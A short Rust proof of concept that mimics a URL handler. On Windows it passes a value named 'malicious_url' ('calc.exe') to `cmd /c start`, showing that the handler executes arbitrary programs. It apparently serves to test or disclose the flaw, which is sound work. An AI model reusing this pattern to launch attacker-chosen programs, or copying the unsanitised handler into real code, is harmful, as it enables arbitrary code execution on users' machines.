use std::process::Command;

fn main() {
    let malicious_url = "calc.exe";
    println!("Attempting to open: {}", malicious_url);

    // Mimic the code in handler.rs
    #[cfg(target_os = "windows")]
    {
        // On Windows, Command::new("cmd").args(...) quotes arguments.
        // `cmd /c start "" "calc.exe"` -> start executes the quoted string as a command/path.
        let output = Command::new("cmd")
            .args(["/c", "start", "", malicious_url])
            .output()
            .expect("failed to execute process");
        
        println!("Output: {:?}", output);
    }
}
